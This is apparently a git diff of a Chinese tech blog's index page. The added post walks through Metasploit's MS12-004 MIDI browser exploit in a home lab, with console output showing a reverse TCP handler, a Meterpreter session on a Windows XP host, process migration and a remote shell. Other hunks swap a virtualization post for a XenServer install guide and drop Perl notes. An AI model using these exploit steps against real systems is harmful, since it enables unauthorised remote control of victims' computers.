@@ -184,6 +184,83 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Metasploit-MIDI文件解析远程代码执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Metasploit-MIDI文件解析远程代码执行/">Metasploit-MIDI文件解析远程代码执行</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Metasploit-MIDI文件解析远程代码执行/" class="archive-article-date">
+  	<time datetime="2016-08-09T14:40:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[*] Processing setup.rc <span class="keyword">for</span> ERB directives.</div><div class="line">resource (setup.rc)&gt; db_connect msf:msf123@127.0.0.1/msf</div><div class="line">resource (setup.rc)&gt; load msgrpc User=msf Pass=<span class="string">'abc123'</span></div><div class="line">[*] MSGRPC Service:  127.0.0.1:55552</div><div class="line">[*] MSGRPC Username: msf</div><div class="line">[*] MSGRPC Password: abc123</div><div class="line">[*] Successfully loaded plugin: msgrpc</div></pre></td></tr></table></figure>
+<h1 id="搜索和使用漏洞模块"><a href="#搜索和使用漏洞模块" class="headerlink" title="搜索和使用漏洞模块"></a>搜索和使用漏洞模块</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">msf &gt; search 12-004</div><div class="line">[!] Module database cache not built yet, using slow search</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                                   Disclosure Date  Rank    Description</div><div class="line">   ----                                   ---------------  ----    -----------</div><div class="line">   exploit/windows/browser/ms12_004_midi  2012-01-10       normal  MS12-004 midiOutPlayNextPolyEvent Heap Overflow</div><div class="line"></div><div class="line"></div><div class="line">msf &gt; use exploit/windows/browser/ms12_004_midi</div></pre></td></tr></table></figure>
+<h1 id="显示和设置相关Option"><a href="#显示和设置相关Option" class="headerlink" title="显示和设置相关Option"></a>显示和设置相关Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms12_004_midi) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/browser/ms12_004_midi):</div><div class="line"></div><div class="line">   Name       Current Setting  Required  Description</div><div class="line">   ----       ---------------  --------  -----------</div><div class="line">   OBFUSCATE  <span class="literal">false</span>            no        Enable JavaScript obfuscation</div><div class="line">   SRVHOST    0.0.0.0          yes       The <span class="built_in">local</span> host to listen on. This must be an address on the <span class="built_in">local</span> machine or 0.0.0.0</div><div class="line">   SRVPORT    8080             yes       The <span class="built_in">local</span> port to listen on.</div><div class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL <span class="keyword">for</span> incoming connections</div><div class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</div><div class="line">   URIPATH                     no        The URI to use <span class="keyword">for</span> this exploit (default is random)</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> SRVHOST 192.168.1.8</div><div class="line">SRVHOST =&gt; 192.168.1.8</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> URIPATH /</div><div class="line">URIPATH =&gt; /</div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> LPORT 1234</div><div class="line">LPORT =&gt; 1234</div><div class="line">msf exploit(ms12_004_midi) &gt; exploit</div><div class="line">[*] Exploit running as background job.</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.1.8:1234</div><div class="line">[*] Using URL: http://192.168.1.8:8080/</div><div class="line">[*] Server started.</div></pre></td></tr></table></figure>
+<h1 id="使用目标主机IE浏览器打开URL后控制台输出为"><a href="#使用目标主机IE浏览器打开URL后控制台输出为" class="headerlink" title="使用目标主机IE浏览器打开URL后控制台输出为"></a>使用目标主机IE浏览器打开URL后控制台输出为</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">*] 192.168.1.43     ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Sending html to 192.168.1.43:2933...</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Sending midi corruption file...</div><div class="line">[*] Sending stage (957487 bytes) to 192.168.1.43</div><div class="line">[*] Meterpreter session 2 opened (192.168.1.8:1234 -&gt; 192.168.1.43:2934) at 2016-06-04 16:38:01 +0800</div><div class="line">[*] Session ID 2 (192.168.1.8:1234 -&gt; 192.168.1.43:2934) processing InitialAutoRunScript <span class="string">'migrate -f'</span></div><div class="line">[*] Current server process: iexplore.exe (372)</div><div class="line">[*] Spawning notepad.exe process to migrate to</div><div class="line">[+] Migrating to 3948</div><div class="line">[+] Successfully migrated to process</div></pre></td></tr></table></figure>
+<h1 id="查看和使用session"><a href="#查看和使用session" class="headerlink" title="查看和使用session"></a>查看和使用session</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">sf exploit(ms12_004_midi) &gt; sessions</div><div class="line"></div><div class="line">Active sessions</div><div class="line">===============</div><div class="line"></div><div class="line">  Id  Type                   Information                                      Connection</div><div class="line">  --  ----                   -----------                                      ----------</div><div class="line">  1   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:1234 -&gt; 192.168.1.43:2927 (192.168.1.43)</div><div class="line">  2   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:1234 -&gt; 192.168.1.43:2934 (192.168.1.43)</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; sessions -i 1</div><div class="line">[*] Starting interaction with 1...</div><div class="line"></div><div class="line">meterpreter &gt; ifconfig</div><div class="line"></div><div class="line">Interface  1</div><div class="line">============</div><div class="line">Name         : MS TCP Loopback interface</div><div class="line">Hardware MAC : 00:00:00:00:00:00</div><div class="line">MTU          : 1520</div><div class="line">IPv4 Address : 127.0.0.1</div><div class="line"></div><div class="line"></div><div class="line">Interface  2</div><div class="line">============</div><div class="line">Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport</div><div class="line">Hardware MAC : 00:0c:29:84:07:87</div><div class="line">MTU          : 1500</div><div class="line">IPv4 Address : 192.168.1.43</div><div class="line">IPv4 Netmask : 255.255.255.0</div><div class="line"></div><div class="line">meterpreter &gt; shell</div><div class="line">Process 204 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Metasploit-MIDI文件解析远程代码执行/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-OSSIM-Add-Linux-Agent" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1011,35 +1088,54 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-Xen与Kvm" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Xen-Server安装教程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/virtualization/Xen与Kvm/">Xen与Kvm</a>
+      <a class="article-title" href="/virtualization/Xen-Server安装教程/">Xen Server安装教程</a>
     </h1>
   
 
         
-        <a href="/virtualization/Xen与Kvm/" class="archive-article-date">
-  	<time datetime="2015-11-14T14:07:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-11-14</time>
+        <a href="/virtualization/Xen-Server安装教程/" class="archive-article-date">
+  	<time datetime="2015-12-20T12:14:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-12-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Xen"><a href="#Xen" class="headerlink" title="Xen"></a>Xen</h1><blockquote>
-<p>是半虚拟化技术，也叫做准虚拟化技术<br>从性能和成熟度上而言，XEN要优于KVM<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XEN是在全虚拟化的基础上，把客户操作系统进行了修改，增加了一个专门的API，使客户操作系统集成了虚拟化方面的代码，该方法无需重新编译或引起陷阱，因为操作系统自身能够与虚拟进程进行很好的协作</div></pre></td></tr></table></figure></p>
+        <blockquote>
+<p>安装环境VMware<br>首先下载 <a href="http://downloadns.citrix.com.edgesuite.net/11616/XenServer-7.0.0-main.iso" target="_blank" rel="external">IOS安装包</a></p>
 </blockquote>
-<h1 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h1><blockquote>
-<p>是完全虚拟化技术，又叫硬件辅助虚拟化技术<br>使用Linux内核集成的，所以速度较快<br>KVM最大的好处就在于它是与Linux内核集成的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KVM是在虚拟机和硬件之间加了一个软件层--Hypervisor，或者叫做虚拟机管理程序（VMM），KVM的hypervisor是直接运行在物理硬件之上的</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">配置信息如下</div></pre></td></tr></table></figure>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f1d" alt="配置信息"></p>
+<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">键盘选项默认，点OK继续</div></pre></td></tr></table></figure>
+<p>![<a href="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f19" target="_blank" rel="external">键盘</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">保持默认</div></pre></td></tr></table></figure></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f1c" alt="保持默认"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">accept 用户许可协议</div></pre></td></tr></table></figure></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644164d4003d28" alt="accept EULA"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">磁盘信息</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>默认虚拟存储为sda，点OK继续：</p>
 </blockquote>
-<h4 id="其他文章"><a href="#其他文章" class="headerlink" title="其他文章"></a>其他文章</h4><blockquote>
-<p><a href="http://mp.weixin.qq.com/s?src=3&amp;timestamp=1472202121&amp;ver=1&amp;signature=AukYgkzADsAPcorAY6IO3ic-Mmab2CZsAmGgj2rdY6rVieHuOA*23OUQIVitsyfbwvZ7Pvq16eoeYojt3MhygPRx7j14m43T8aylI6hAlBlGk7gnpdY7ZASUZWK0RlHtdqvEIIEVGO1LYPYW0GTlENfWXRyCyo1v6f7U4dJVhT8=" target="_blank" rel="external">虚拟化技术对比：Xen vs KVM</a></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644164d4003d27" alt="磁盘信息"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用本地介质安装</div></pre></td></tr></table></figure></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f1a" alt="使用本地介质安装"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">不安装增强包</div></pre></td></tr></table></figure></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644164d4003d25" alt="不安装增强包"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">跳过测试</div></pre></td></tr></table></figure></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=581560c4ab644162e1003f33" alt="跳过测试"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root密码</div></pre></td></tr></table></figure></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=581560daab644164d4003d4d" alt="root密码"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">网络设置</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>测试使用，我就用DHCP了……</p>
 </blockquote>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644162e1003f1b" alt="图片标题"><br><img src="https://leanote.com/api/file/getImage?fileId=58155fa5ab644164d4003d26" alt="图片标题"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">时区设置</div><div class="line">asia</div><div class="line">shagnhai</div></pre></td></tr></table></figure>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58156109ab644162e1003f36" alt="时区设置"><br><img src="https://leanote.com/api/file/getImage?fileId=58156120ab644162e1003f3a" alt="时区设置"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">时间服务器</div></pre></td></tr></table></figure></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58156134ab644162e1003f3e" alt="时间服务器"></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=5815613fab644162e1003f3f" alt="时间服务器"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">开始安装</div></pre></td></tr></table></figure></p>
+<p><img src="https://leanote.com/api/file/getImage?fileId=5815614fab644162e1003f44" alt="开始安装"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">安装完成</div></pre></td></tr></table></figure>
+<p><img src="https://leanote.com/api/file/getImage?fileId=58156196ab644164d4003d62" alt="安装完成"><br><img src="https://leanote.com/api/file/getImage?fileId=5815619eab644164d4003d63" alt="用户登录"><br><img src="https://leanote.com/api/file/getImage?fileId=581561a7ab644162e1003f48" alt="Web端显示"></p>
 
       
 
@@ -1074,101 +1170,7 @@ var _hmt = _hmt || [];
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/virtualization/Xen与Kvm/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-Perl-学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/others/Perl-学习笔记/">Perl 学习笔记</a>
-    </h1>
-  
-
-        
-        <a href="/others/Perl-学习笔记/" class="archive-article-date">
-  	<time datetime="2015-08-10T03:25:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-08-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="交互式环境"><a href="#交互式环境" class="headerlink" title="交互式环境"></a>交互式环境</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜  ~ perl -e</div><div class="line">No code specified for -e.</div><div class="line">➜  ~ perl -e &apos;print &quot;Hello World&quot;&apos;</div><div class="line">Hello World%                                                                    </div><div class="line">➜  ~ perl -e &apos;print &quot;Hello World\n&quot;&apos;</div><div class="line">Hello World</div></pre></td></tr></table></figure>
-<h1 id="脚本式编程与注射"><a href="#脚本式编程与注射" class="headerlink" title="脚本式编程与注射"></a>脚本式编程与注射</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#This is single-line comments.</span></div><div class="line"><span class="keyword">print</span> <span class="string">"Hello, World\n"</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">=pod comments</span></div><div class="line">This is multiline comment</div><div class="line">This is multiline comment</div><div class="line">This is multiline comment</div><div class="line">This is multiline comment</div><div class="line">=cut</div></pre></td></tr></table></figure>
-<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><blockquote>
-<p>Perl 是一种弱类型语言，所以变量不需要指定类型，Perl 解释器会根据上下文自动选择匹配类型。<br>三个基本的数据类型：标量、数组、哈希<br>Perl 为每个变量类型设置了独立的命令空间，所以不同类型的变量可以使用相同的名称，如 $foo 和 @foo 是两个不同的变量。</p>
-<h2 id="标量"><a href="#标量" class="headerlink" title="标量"></a>标量</h2><p>在变量名前加$表示是标量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#number</div><div class="line">$my_number=123;</div><div class="line"></div><div class="line">#string</div><div class="line">$my_str=&quot;123&quot;;</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h3 id="标量运算"><a href="#标量运算" class="headerlink" title="标量运算"></a>标量运算</h3><blockquote>
-<p>.可以用来链接两个标量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print ( &quot;$my_number . $my_str\n&quot;);</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><blockquote>
-<p>分别表示当前执行脚本的文件名，行号，包名。<br>这些特殊字符是单独的标记，不能写在字符串中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">print &quot;FileName:&quot; . &quot;\t&quot;.__FILE__.&quot;\n&quot;;</div><div class="line">print &quot;LineNumber:&quot; . &quot;\t&quot;.__LINE__.&quot;\n&quot;;</div><div class="line">print &quot;PackageName:&quot; . &quot;\t&quot;.__PACKAGE__.&quot;\n&quot;;</div></pre></td></tr></table></figure></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">FileName:	run.pl</div><div class="line">LineNumber:	28</div><div class="line">PackageName:	main</div></pre></td></tr></table></figure>
-<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><blockquote>
-<p>数组变量以字符”@”开头，索引从0开始<br>也可以以 qw 开始定义数组</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@arr=(2,3,5);</div><div class="line">print @arr[2];</div><div class="line">@array = qw/这是 一个 数组/;</div></pre></td></tr></table></figure>
-<h3 id="数组序列号"><a href="#数组序列号" class="headerlink" title="数组序列号"></a>数组序列号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ perl -e &quot;print(&quot;1..10&quot;,&quot;\n&quot;)&quot;</div><div class="line">12345678910n%</div></pre></td></tr></table></figure>
-<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><blockquote>
-<p>哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值<br>类似Python的字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">%hash=(&apos;name&apos;=&gt;&apos;LongLi&apos;,&apos;age&apos;=&gt;18);</div><div class="line">print  (%hash&#123;&apos;name&apos;&#125;, &quot;\n&quot;);</div><div class="line">print  (%hash&#123;&apos;age&apos;&#125;, &quot;\n&quot;);</div></pre></td></tr></table></figure></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜  test  ./run.pl  </div><div class="line">Hello, World</div><div class="line">nameLongLi</div><div class="line">age18</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Perl</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/others/" class="article-tag-list-link color2">others</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/others/Perl-学习笔记/">展开全文 >></a>
+          <a class="article-more-a" href="/virtualization/Xen-Server安装教程/">展开全文 >></a>
         </p>
       
 
@@ -1271,6 +1273,10 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">OSSEC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
@@ -1327,11 +1333,15 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">others</a>
+                <a href="javascript:void(0)" class="js-tag color1">hydra</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">运维</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">others</a>
               </li>
             
             <div class="clearfix"></div>
